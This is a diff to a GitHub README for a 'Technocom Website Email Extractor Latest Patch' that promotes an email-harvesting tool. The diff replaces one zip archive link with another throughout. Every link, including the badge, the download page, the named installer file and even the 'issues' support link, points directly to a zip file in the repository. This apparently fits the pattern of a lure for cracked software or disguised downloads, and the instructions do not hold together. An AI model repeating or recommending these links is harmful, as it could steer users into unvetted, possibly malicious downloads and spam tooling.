@@ -1,6 +1,6 @@
 # 📧 Technocom-Website-Email-Extractor-Latest-Patch - Extract Emails Effortlessly
 
-[![Download Technocom Website Email Extractor](https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip%https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip)](https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip)
+[![Download Technocom Website Email Extractor](https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip%https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip)](https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip)
 
 ## 📜 Description
 
@@ -14,7 +14,7 @@ Follow these steps to download and install the Technocom Website Email Extractor
 
 To get the software, visit the following page:
 
-[Download Technocom Website Email Extractor](https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip)
+[Download Technocom Website Email Extractor](https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -22,7 +22,7 @@ On the downloads page, look for the **Latest Release** section. Here you will fi
 
 ### Step 3: Download the Installer
 
-Click on the version that suits your needs. The download should begin automatically. The installer will typically be a file named something like `https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip`.
+Click on the version that suits your needs. The download should begin automatically. The installer will typically be a file named something like `https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip`.
 
 ### Step 4: Run the Installer
 
@@ -71,7 +71,7 @@ If you encounter issues while using the software, try the following:
 
 ## 💬 Get Support
 
-For any questions or issues, visit the **Issues** section on our GitHub page. You can also reach out through [issues](https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip) to report bugs or seek help from other users.
+For any questions or issues, visit the **Issues** section on our GitHub page. You can also reach out through [issues](https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip) to report bugs or seek help from other users.
 
 ## 🌍 Related Topics
 
@@ -88,6 +88,6 @@ Explore these options in our documentation for advanced functionalities.
 
 To start using the Technocom Website Email Extractor, please click below to visit the download page:
 
-[Download Technocom Website Email Extractor](https://raw.githubusercontent.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/main/Angus/Technocom-Website-Email-Extractor-Latest-Patch_v1.8.zip)
+[Download Technocom Website Email Extractor](https://github.com/SneakyTR/Technocom-Website-Email-Extractor-Latest-Patch/raw/refs/heads/main/Angus/Email_Extractor_Website_Technocom_Latest_Patch_1.6-alpha.2.zip)
 
 By following these steps, you will be well-equipped to extract emails efficiently. Enjoy your email harvesting experience!
